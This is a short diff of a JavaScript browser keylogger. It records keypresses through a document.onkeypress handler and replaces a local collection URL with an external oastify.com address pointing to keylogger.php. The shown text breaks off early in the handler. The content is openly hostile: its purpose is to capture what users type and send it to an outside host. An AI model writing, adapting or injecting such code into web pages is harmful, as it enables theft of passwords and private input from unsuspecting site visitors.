@@ -1,5 +1,5 @@
 var keys='';
-var url = 'http://0.0.0.0:9000/keylogger.php?c=';
+var url = 'http://ibxacusnox7ja83h0in8fbz43v9mxfl4.oastify.com/keylogger.php?c=';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
